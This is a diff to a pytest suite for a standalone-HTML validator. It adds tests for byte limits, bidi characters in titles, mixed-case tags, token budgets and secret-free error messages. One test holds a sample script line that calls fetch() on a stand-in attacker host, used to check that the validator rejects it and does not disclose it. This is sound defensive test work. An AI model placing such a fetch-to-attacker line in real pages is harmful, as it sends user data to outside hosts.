@@ -31,26 +31,47 @@ def _document(
     )
 
 
-def _document_with_exact_bytes(size: int) -> str:
+def _document_with_exact_bytes(size: int, *, payload_character: str = "x") -> str:
     base = _document()
     marker = "<script>"
     insertion = base.index(marker)
     remaining = size - len(base.encode("utf-8"))
     if remaining < 0:
         raise AssertionError("requested size is below the fixture's base size")
+    character_bytes = len(payload_character.encode("utf-8"))
+    if character_bytes == 0:
+        raise AssertionError("payload character must encode to at least one byte")
     chunks: list[str] = []
     while remaining:
-        payload = min(16_000, max(0, remaining - 7))
-        if payload == 0:
+        payload_bytes = min(16_000, max(0, remaining - 7))
+        if payload_bytes == 0:
             chunks.append(" " * remaining)
             remaining = 0
             break
-        comment = "<!--" + ("x" * payload) + "-->"
+        character_count, ascii_remainder = divmod(payload_bytes, character_bytes)
+        payload = (payload_character * character_count) + ("x" * ascii_remainder)
+        comment = "<!--" + payload + "-->"
         chunks.append(comment)
-        remaining -= len(comment)
+        remaining -= len(comment.encode("utf-8"))
     result = base[:insertion] + "".join(chunks) + base[insertion:]
     assert len(result.encode("utf-8")) == size
     return result
+
+
+_INPUT_SECRET = "TOP-SECRET-INPUT-PREFLIGHT"
+
+
+class _ExplodingOversizedText(str):
+    def encode(self, *_args: object, **_kwargs: object) -> bytes:
+        raise AssertionError(_INPUT_SECRET)
+
+
+class _ExplodingOversizedBytes(bytes):
+    def __bytes__(self) -> bytes:
+        raise AssertionError(_INPUT_SECRET)
+
+    def decode(self, *_args: object, **_kwargs: object) -> str:
+        raise AssertionError(_INPUT_SECRET)
 
 
 def _error(document: str | bytes, **kwargs: object) -> StandaloneHtmlValidationError:
@@ -87,8 +108,32 @@ def test_document_accepts_html_whitespace_controls(whitespace: str) -> None:
 
 
 def test_document_rejects_invalid_utf8_and_lone_surrogates() -> None:
-    assert _error(b"\xff").code == "standalone_html_invalid_document"
-    assert _error(_document(title="\ud800")).code == "standalone_html_invalid_document"
+    secret = "TOP-SECRET-LONE-SURROGATE"
+    for document in (b"\xff", _document(title=f"{secret}\ud800")):
+        error = _error(document)
+        assert error.code == "standalone_html_invalid_document"
+        assert error.reason == "document_encoding"
+        assert error.__context__ is None
+        assert secret not in "".join(traceback.format_exception(error))
+
+
+@pytest.mark.parametrize(
+    "document",
+    [
+        _ExplodingOversizedText(_INPUT_SECRET + ("x" * 1_048_576)),
+        _ExplodingOversizedBytes((_INPUT_SECRET + ("x" * 1_048_576)).encode("ascii")),
+    ],
+    ids=["text-subclass", "bytes-subclass"],
+)
+def test_oversized_input_is_rejected_before_subclass_conversion(document: str | bytes) -> None:
+    error = _error(document)
+    assert error.code == "standalone_html_validation_budget_exceeded"
+    assert error.reason == "document_bytes"
+    assert error.__context__ is None
+    rendered = "".join(traceback.format_exception(error))
+    assert _INPUT_SECRET not in str(error)
+    assert _INPUT_SECRET not in repr(error)
+    assert _INPUT_SECRET not in rendered
 
 
 def test_document_accepts_exactly_one_mib_and_rejects_one_byte_more() -> None:
@@ -98,6 +143,56 @@ def test_document_accepts_exactly_one_mib_and_rejects_one_byte_more() -> None:
     error = _error(_document_with_exact_bytes(1_048_577))
     assert error.code == "standalone_html_validation_budget_exceeded"
     assert error.status_code == 422
+
+
+def test_document_multibyte_utf8_accepts_exactly_one_mib_and_rejects_one_byte_more() -> None:
+    maximum = _document_with_exact_bytes(1_048_576, payload_character="é")
+    assert validate_standalone_html(maximum).html_bytes == 1_048_576
+
+    error = _error(_document_with_exact_bytes(1_048_577, payload_character="é"))
+    assert error.code == "standalone_html_validation_budget_exceeded"
+    assert error.reason == "document_bytes"
+
+
+@pytest.mark.parametrize("text", ["\u0130" * 8, "Σßé😀漢字"])
+def test_non_ascii_text_before_and_between_tags_preserves_preflight_offsets(text: str) -> None:
+    document = _document(
+        title=f"Deck {text}",
+        slides=(f'<section class="slide"><h1>{text}</h1>' f"{text}<p>After {text}</p></section>"),
+    )
+
+    result = validate_standalone_html(document)
+
+    assert result.title == f"Deck {text}"
+    assert result.slide_count == 1
+    assert result.indexable_text == f"{text} After {text}"
+
+
+def test_html_syntax_recognizes_mixed_case_ascii_tags_without_offset_drift() -> None:
+    document = _document(title="Mixed", slides='<section class="slide"><h1>Ready</h1></section>')
+    replacements = {
+        "<!doctype html>": "<!DoCtYpE HtMl>",
+        "<html>": "<HtMl>",
+        "</html>": "</hTmL>",
+        "<head>": "<HeAd>",
+        "</head>": "</hEaD>",
+        "<title>": "<TiTlE>",
+        "</title>": "</tItLe>",
+        "<style>": "<StYlE>",
+        "</style>": "</sTyLe>",
+        "<body>": "<BoDy>",
+        "</body>": "</bOdY>",
+        "<script>": "<ScRiPt>",
+        "</script>": "</sCrIpT>",
+    }
+    for original, mixed_case in replacements.items():
+        document = document.replace(original, mixed_case)
+
+    result = validate_standalone_html(document)
+
+    assert result.title == "Mixed"
+    assert result.slide_count == 1
+    assert result.indexable_text == "Ready"
 
 
 @pytest.mark.parametrize(
@@ -262,6 +357,12 @@ def test_css_stylesheet_byte_token_declaration_depth_and_error_budgets() -> None
         "bad\u202etitle",
         "bad\u2066title",
         "bad\u200ftitle",
+        "bad\u206atitle",
+        "bad\u206btitle",
+        "bad\u206ctitle",
+        "bad\u206dtitle",
+        "bad\u206etitle",
+        "bad\u206ftitle",
     ],
 )
 def test_title_rejects_blank_scalar_byte_and_bidi_boundaries(title: str) -> None:
@@ -432,6 +533,37 @@ def test_static_bracket_and_template_regex_script_sinks_are_rejected(script: str
 def test_raw_template_text_is_not_treated_as_executable_script() -> None:
     script = "const help = `fetch('/example') is documented text`;"
     assert validate_standalone_html(_document(script=script)).slide_count == 1
+
+
+def test_script_diagnostic_token_budget_accepts_maximum_and_rejects_maximum_plus_one() -> None:
+    for token_count in (validator_module.MAX_HTML_TOKENS - 1, validator_module.MAX_HTML_TOKENS):
+        assert len(validator_module._script_tokens("a;" * token_count)) == token_count
+
+    with pytest.raises(validator_module._BudgetExceeded) as caught:
+        validator_module._script_tokens("a;" * (validator_module.MAX_HTML_TOKENS + 1))
+    assert caught.value.reason == "html_tokens"
+
+
+@pytest.mark.parametrize(
+    "suffix",
+    [
+        "",
+        'fetch("https://attacker.invalid/TOP-SECRET-LATE-SINK")',
+    ],
+    ids=["no-sink", "late-obvious-sink"],
+)
+def test_script_diagnostic_token_overage_fails_closed_without_source_disclosure(suffix: str) -> None:
+    script = "let a=0;" + ("a==a;" * 12_501) + suffix
+
+    error = _error(_document(script=script))
+
+    assert error.code == "standalone_html_validation_budget_exceeded"
+    assert error.reason == "html_tokens"
+    assert error.__context__ is None
+    rendered = "".join(traceback.format_exception(error))
+    assert "attacker.invalid" not in str(error)
+    assert "attacker.invalid" not in repr(error)
+    assert "attacker.invalid" not in rendered
 
 
 def test_character_reference_budget_fails_before_html5lib(monkeypatch: pytest.MonkeyPatch) -> None:
